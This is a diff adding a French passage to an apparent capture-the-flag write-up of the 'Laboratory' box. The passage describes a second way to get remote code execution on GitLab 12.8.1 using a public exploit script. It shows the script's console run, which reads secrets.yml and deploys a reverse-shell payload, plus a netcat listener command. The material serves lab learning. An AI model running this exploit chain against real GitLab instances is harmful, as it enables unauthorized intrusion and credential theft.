@@ -214,6 +214,33 @@ root@8d3027edf640:/tmp# md5sum /var/opt/gitlab/gitlab-rails/etc/secrets.yml
 
 
 
+
+**Deuxième solution pour le RCE**
+Il existe un script qui automatise toute la partie vue ci-dessus :  [https://github.com/dotPY-hax/gitlab_RCE](https://github.com/dotPY-hax/gitlab_RCE) 
+Il est nécéssaire de le modifier pour aller taper sur le Squid et désactiver la vérification de certificat SSL auto-signé.
+
+```bash 
+{15:33}/netsec/box/Laboratory ➭ python3 gitlab_rce.py https://gitlab.laboratory.ctf 192.168.1.37
+Gitlab Exploit by dotPY [insert fancy ascii art]
+registering auy1SeqvF6:04mD45pYMk - 200
+Getting version of https://gitlab.laboratory.ctf - 200
+The Version seems to be 12.8.1! Choose wisely
+delete user auy1SeqvF6 - 200
+[0] - GitlabRCE1147 - RCE for Version <=11.4.7
+[1] - GitlabRCE1281LFIUser - LFI for version 10.4-12.8.1 and maybe more
+[2] - GitlabRCE1281RCE - RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP
+type a number and hit enter to choose exploit: 2
+Start a listener on port 42069 and hit enter (nc -vlnp 42069)
+registering ILMgLy6G55:ZsBDvY8C9k - 200
+creating project soOIauiULL - 200
+creating project 3VzymEcL6y - 200
+creating issue ZRzosgObR2 for project soOIauiULL - 200
+moving issue from soOIauiULL to 3VzymEcL6y - 200
+Grabbing file secrets.yml
+deploying payload - 500
+delete user ILMgLy6G55 - 200
+```
+
 ## Container Lateral Escapce
 
 
